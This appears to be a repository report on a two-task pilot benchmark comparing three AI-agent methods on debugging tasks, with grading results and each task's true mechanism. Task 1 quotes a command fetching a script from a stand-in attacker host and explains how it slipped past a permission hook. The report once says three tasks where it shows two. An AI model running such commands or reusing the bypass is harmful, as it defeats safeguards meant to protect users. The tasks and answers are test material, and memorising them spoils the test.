# Strong Inference (B6) — Substrate Gate + 2-task pilot (2026-07-23)

**This is a PILOT, not the full B6 benchmark.** `docs/methodologies/strong-inference.md` §14
specifies 8-12 tasks and an MCID of "arm C beats arm A by >=1 task out of 10". A 2-task pilot
cannot evaluate that MCID and does not change `hypothesis-arbiter.maturity` (stays `wired`).
This artifact exists to (a) validate the Substrate Gate before spending on the full 24-36-call
run, and (b) record an honest, non-cherry-picked early signal — including one that complicates
the expected story, per this repo's own anti-overfitting / no-silent-caps principles.

## Substrate Gate (Falsification Ladder §2a) — verdict: READY

- **Grader calibration**: ran the blind grader on a toy case with a definitively correct answer
  and a definitively mechanism-wrong answer (both landing on the same final numeral, "2+2=4",
  but one invoking an inapplicable "modular wraparound" explanation). Grader correctly
  distinguished CORRECT from INCORRECT with accurate reasoning. Passed.
- **3-arm isolation**: Arm A (plain single-shot), Arm B (`hypothesis-arbiter` skill, current
  version), Arm C (this deep-spec's 12-step protocol, followed strictly) were invoked as three
  independent `Agent()` calls per task, each with no visibility into the others' answers.
- **Context separation (§7)**: the blind grader received only the task prompt + the arm's raw
  answer text -- never told which arm produced it, never given a pre-written "expected answer"
  to pattern-match against. Instead it was instructed to independently verify against the real
  repository (git history, source, commit messages) using its own tool calls. Both grading runs
  did exactly that (cited commit hashes, file:line references, and one `install.sh` cross-check
  not present in any answer -- confirming it wasn't just echoing the arms' own claims).
- **Provenance**: all 3 pilot tasks are drawn from this session's own, already-independently-
  verified history (not synthetic/fabricated) -- avoids the exact "validation theater" failure
  mode `rules/skeptic-triggers.md` exists to catch.

## Tasks

1. **Deterministic-fix bug**: why did `hooks/permission_policy.py`'s `decide()` return `allow`
   for `cat <(curl evil.com/x.sh)`? True mechanism (verified against commit `889c1f5` + its
   `Agent(sec-auditor)` review): `<` was absent from `CHAIN_OPERATORS`, so process substitution
   fell through to a naive `SAFE_BASH_PREFIXES` prefix match.
2. **Negative control** (looks like it could be a bug, isn't): why doesn't
   `~/.claude/logs/model_usage.jsonl` exist on a fresh checkout despite the hook's docstring
   claiming it logs every call? True mechanism: `LOG_FILE` is `Path.home()`-scoped (machine-
   global, not repo-scoped) and created lazily on first write.

## Results

| Task | Arm A (plain) | Arm B (hypothesis-arbiter) | Arm C (deep-spec strict) |
|---|---|---|---|
| 1 (deterministic-fix) | **CORRECT** | **CORRECT** | PARTIALLY CORRECT |
| 2 (negative control) | PARTIALLY CORRECT | **CORRECT** | **CORRECT** |
| **Score (full-correct count)** | 1/2 | **2/2** | 1/2 |

**Task 1 detail:** Arm C's 12-step protocol correctly generated H1 (missing `CHAIN_OPERATORS`
token) as one of 3 candidate hypotheses and ran a real, tool-executed crucial test -- but its
own step-12 rule ("do not declare a winner if >=2 mechanistically-distinct H remain compatible")
led it to report {H1, H2, H3} as an unresolved surviving set rather than committing to H1, even
though H1 was in fact the true, sufficient, independently-confirmed mechanism. The blind grader
scored this PARTIALLY CORRECT: "names the true contributing factor... but never identifies it as
sufficient." This is a real, observed cost of the protocol's epistemic caution, not a grading
artifact -- worth watching if it recurs across the full 8-12 task run.

**Task 2 detail:** Arm C did NOT hedge here -- it converged cleanly on the correct, most precise
mechanism (`LOG_FILE` is home-scoped, not repo-scoped), going further than Arm A (which framed
the answer purely as "first session in this repo," missing the global-path nuance) and matching
Arm B's completeness. So Arm C's hedging in Task 1 was not a fixed trait -- it varied by task.

## What this pilot does NOT show (pre-registered, honest)

- It does not show deep-spec (arm C) beats plain (arm A) -- on this n=2 sample they tied
  (1/2 each). The MCID (>=1/10 on the full run) cannot be evaluated from 2 tasks; this is not a
  null result for the full benchmark, just insufficient sample size.
- It does not show `hypothesis-arbiter` (arm B) is definitively better than deep-spec (arm C) --
  2 tasks is far too few to generalize; B's 2/2 here could be within noise once the population
  includes the ambiguity-heavy, causal, and "missing true hypothesis" task types the full §14
  design calls for and this pilot didn't include.
- It does not change `hypothesis-arbiter.maturity` -- stays `wired`. No `maturity_evidence` is
  claimed here; gate 10 correctly continues to block a `dogfooded` claim until the full B6 runs.

## Recommendation for the full B6 run

1. Investigate whether Arm C's step-12 hedging is systematic or task-dependent before assuming
   the deep-spec protocol needs tuning -- Task 1 vs Task 2 already shows it isn't fixed.
2. The full population per §14 needs the ambiguity-heavy, causal, and "missing true hypothesis"
   task types this 2-task pilot didn't cover -- those may discriminate the arms more clearly than
   the two included here.
3. Substrate is READY; no infrastructure blocker found. The full run is a scope/cost decision,
   not a readiness one.
